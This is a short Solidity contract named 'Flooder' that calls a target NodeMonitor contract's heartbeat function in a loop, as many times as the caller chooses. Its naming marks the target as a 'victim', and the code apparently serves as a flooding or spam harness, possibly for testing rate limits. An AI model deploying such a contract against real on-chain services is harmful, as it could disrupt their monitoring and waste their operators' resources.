pragma solidity ^0.8.21;

interface NodeMonitor {
    function heartbeat(address node) external;
}

contract Flooder {
    NodeMonitor public victim;

    constructor(address _victim) {
        victim = NodeMonitor(_victim);
    }

    function flood(address node, uint256 times) external {
        for (uint256 i = 0; i < times; i++) {
            victim.heartbeat(node);
        }
    }
}
